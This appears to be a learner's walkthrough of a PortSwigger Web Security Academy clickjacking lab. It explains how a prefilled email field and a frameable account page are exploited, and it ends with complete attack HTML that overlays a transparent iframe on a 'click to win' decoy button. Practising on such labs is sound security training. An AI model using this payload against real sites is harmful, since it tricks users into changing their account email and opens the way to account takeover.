https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input


This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter


in this case we need to prefill the form to perform the malicious action, but we can fill it using the get parameters looking at the name of the input field in the form

1) we can see on the website that we can force the filling of input using a parameter in get request
    https://0a5700a5046c6528819b8a5e00f900d1.web-security-academy.net/my-account?id=wiener&email=test@email.it

2) the website allows users to include it in iframes so we can create a page to exploit clickjacking



<html>

<head>
	<style>
		#target_website {
			position:relative;
			width:1000px;
			height:1000px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
                        left: 80px;
                        top: 470px;
			}
	</style>
</head>
<body>
	<div id="decoy_website">
                <button> click to win </button>
	</div>
	<iframe id="target_website" src="https://*******************************LAB-ID*************************.web-security-academy.net/my-account?email=malicious2ppppp@email.com">
	</iframe>
</body>

</html>
